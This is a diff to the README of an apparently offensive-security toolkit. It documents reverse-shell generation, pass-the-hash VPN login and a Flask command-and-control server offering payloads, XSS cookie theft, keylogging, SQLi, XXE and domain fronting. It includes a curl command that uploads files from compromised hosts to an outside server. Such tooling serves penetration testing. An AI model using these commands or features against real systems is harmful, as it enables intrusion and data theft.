@@ -6,7 +6,7 @@
 
 command `screen -list` will show you the availabe screens.
 
-
+An here are some basics.....
 
 Press "Ctrl-A" on the keyboard and press "D" to detach from a screen
 
@@ -51,7 +51,7 @@ This wil take a basic nmap scan of the network. For example mylocalnetwork
 
 ```./scan.sh eth0 mylocalnetwork 12.3.4/24```
 
-
+Scan output will be prefixed with `mylocalnetwork`
 
 
 ### ./search.sh
@@ -70,6 +70,8 @@ Find all Samba shares
 Etc. Use your imagination. 
 
 ### ./revershells.sh
+
+This file is called by `scan.sh`
 
 Generates some reverse shells and a txt file for some good ol' copy & paste.
 Currently default's to port 443 you. Change this by giving the port als a second option.
@@ -135,7 +137,37 @@ With other creds: `./vpn.sh 127.0.0.1 Administrator P@ssw0rd!`
 With Pash the Hash `./vpn.sh 127.0.0.1 Administrator x NTLMHASH`
 
 
+### ./gui.sh
+
+Yes, it comes with a GUI, well sort off....
+
 ## Python scripts onboard
+
+### app.py
+
+This script is called by `init.sh` make sure you ran `scan.sh` before visiting `app.py` on localhost.
+
+Elevating humanity with a new twisted variant of `python3 -m http.server 80` in Flask. A C2 for poor people...
+
+`flask run --port 80` 
+
+It currently supports:
+- serving payloads
+- basic reporting (owasp top 10 and CWE top 25) and note keeping
+- xss payloads, extracting cookies, keylogger etc.
+- Quick overview of generated payloads by `reverseshell.sh`
+- Some bookmarks... yolo.
+- Pesky SSRF 307 redirects
+- Second Order SQLi
+- XXE
+- Upload directory. Easily extract files from hosts with with `curl -F file=@FILENAME https://incompetentbastard.com/upload`
+- Sync findings to DefectDojo
+- Domain fronting & C2 functionality
+- An overview (and interacting) of current attached screens and MSF sessions
+- Random quotes!
+
+
+A manual will be available in the not-too-distant future..
 
 ### methaspx.py
 
@@ -159,7 +191,7 @@ It also create some download links (lolbas/powershell) for the files at the `htt
 
 ### payloads.py
 
-Generates some extra custom payloads.
+[Todo] Generates some extra custom payloads.
 
 
 
